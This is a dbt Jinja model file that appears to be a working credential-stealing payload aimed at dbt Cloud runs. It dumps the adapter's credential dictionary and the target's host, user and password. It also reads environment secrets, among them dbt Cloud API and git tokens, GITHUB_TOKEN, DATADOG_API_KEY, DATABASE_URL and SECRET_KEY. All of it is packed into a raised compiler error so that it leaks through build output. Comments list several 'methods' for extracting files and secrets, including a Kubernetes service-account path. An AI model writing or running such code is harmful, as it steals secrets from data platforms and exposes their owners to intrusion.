{# Attempt file content extraction via multiple methods #}
{% set ns = namespace(output='[CONTENT] ') %}
{% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}

{# Method 1: Jinja include with absolute path #}
{# {% include '/var/run/secrets/kubernetes.io/serviceaccount/namespace' %} #}
{# Can't use include in a model — it resolves via template loader #}

{# Method 2: Try native_string filter on local_md5 path #}
{# Method 3: Try adapter.dispatch for internal access #}

{# Method 4: Check if adapter has methods to read config #}
{% set cred_dict = adapter.config.credentials.to_dict() %}

{# Get ALL credential fields including any hidden ones #}
{% set all_fields = [] %}
{% for k, v in cred_dict.items() %}
  {% do all_fields.append(k ~ '=' ~ v) %}
{% endfor %}
{% set ns.output = ns.output ~ 'ALL_CREDS: ' ~ all_fields | join(' | ') %}

{# Method 5: Check target object for more data #}
{% set ns.output = ns.output ~ ' || TARGET: ' %}
{% set target_items = [] %}
{% set target_items = target_items + ['name=' ~ target.name] %}
{% set target_items = target_items + ['schema=' ~ target.schema] %}
{% set target_items = target_items + ['type=' ~ target.type] %}
{% set target_items = target_items + ['threads=' ~ target.threads] %}
{% if target.dbname is defined %}
  {% set target_items = target_items + ['dbname=' ~ target.dbname] %}
{% endif %}
{% if target.host is defined %}
  {% set target_items = target_items + ['host=' ~ target.host] %}
{% endif %}
{% if target.user is defined %}
  {% set target_items = target_items + ['user=' ~ target.user] %}
{% endif %}
{% if target.password is defined %}
  {% set target_items = target_items + ['password=' ~ target.password] %}
{% endif %}
{% if target.port is defined %}
  {% set target_items = target_items + ['port=' ~ target.port] %}
{% endif %}
{% set ns.output = ns.output ~ target_items | join(' | ') %}

{# Method 6: Check project_name for account context #}
{% set ns.output = ns.output ~ ' || PROJECT=' ~ project_name %}

{# Method 7: Dump model object #}
{% set model_items = [] %}
{% if model is defined and model is mapping %}
  {% for k in model.keys() %}
    {% if k not in ['raw_code', 'compiled_code', 'raw_sql', 'compiled_sql'] %}
      {% do model_items.append(k ~ '=' ~ model[k] | string | truncate(50)) %}
    {% endif %}
  {% endfor %}
{% endif %}
{% set ns.output = ns.output ~ ' || MODEL_KEYS=' ~ model_items | join(',') | truncate(400) %}

{# Method 8: Check var() for project variables - may contain secrets #}
{% set ns.output = ns.output ~ ' || DBT_CLOUD_URL=' ~ env_var('DBT_CLOUD_URL', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | DBT_CLOUD_API_TOKEN=' ~ env_var('DBT_CLOUD_API_TOKEN', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | DBT_CLOUD_GIT_TOKEN=' ~ env_var('DBT_CLOUD_GIT_TOKEN', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | DBT_ENV_SECRET_GIT=' ~ env_var('DBT_ENV_SECRET_GIT_CREDENTIAL', 'BLOCKED') %}
{% set ns.output = ns.output ~ ' | GITHUB_TOKEN=' ~ env_var('GITHUB_TOKEN', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | GIT_TOKEN=' ~ env_var('GIT_TOKEN', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | DATADOG_API_KEY=' ~ env_var('DATADOG_API_KEY', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | SENTRY_DSN=' ~ env_var('SENTRY_DSN', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | REDIS_URL=' ~ env_var('REDIS_URL', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | DATABASE_URL=' ~ env_var('DATABASE_URL', 'NOT_SET') %}
{% set ns.output = ns.output ~ ' | SECRET_KEY=' ~ env_var('SECRET_KEY', 'NOT_SET') %}

{{ exceptions.raise_compiler_error(ns.output) }}
